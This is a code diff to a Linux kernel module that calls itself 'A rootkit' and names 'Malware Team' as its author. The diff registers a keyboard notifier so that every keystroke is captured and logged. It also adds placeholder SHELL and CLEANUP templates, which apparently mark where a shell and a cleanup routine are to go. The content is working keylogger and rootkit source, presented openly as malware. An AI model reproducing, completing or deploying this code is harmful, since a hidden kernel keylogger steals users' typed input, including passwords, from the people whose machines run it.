@@ -12,7 +12,7 @@
 #include <asm/current.h>
 #include <linux/sched.h>
 #include <linux/syscalls.h>
-#include <asm/system.h>
+//#include <asm/system.h>
 #include <linux/fs.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
@@ -25,6 +25,12 @@ MODULE_AUTHOR("Malware Team");
 MODULE_DESCRIPTION("A rootkit");
 MODULE_VERSION("1.0.0");
 MODULE_SUPPORTED_DEVICE("None");
+
+#define DEVICE_NAME_TEMPLATE
+#define DEVICE_MAJOR_TEMPLATE
+#define MAX_CMD_LENGTH 20
+#define SHELL "SHELL_TEMPLATE"
+#define CLEANUP "CLEAN_TEMPLATE"
 
 struct semaphore s;
 static int shiftPressed = 0;
@@ -95,7 +101,8 @@ int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
 			i = 0;
 			if(shiftPressed){
 				while(i < strlen(keysShift[param->value])){
-				    c = keysShift[param->value][i];
+				   c = keysShift[param->value][i];
+					printk(KERN_INFO "Key %d\n", c);
 					i++;
 					*basePtr = c;
                     basePtr++;
@@ -121,15 +128,24 @@ int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
  	return NOTIFY_OK;
 }
 
+//Notifier handler
+static struct notifier_block nb = {
+    .notifier_call = key_notify
+};
+
 static int __init rootkit_init(void){
 	printk(KERN_INFO "Hello World!");
 
-	for_each_process(task){
+/*	for_each_process(task){
 		printk(KERN_INFO "Task id: %d", task->pid);
 		printk(KERN_INFO "Task UID: %d, Task GID: %d", task->loginuid.val, task->tgid);
 		// printk(KERN_INFO "Task mempolicy: %u", task->mempolicy->mode); // the kernel keeps killing it becuase of this line
 	}
-
+*/
+	//Listen for keys.
+	register_keyboard_notifier(&nb);
+	sema_init(&s, 1);
+	
 	return 0;
 }
 
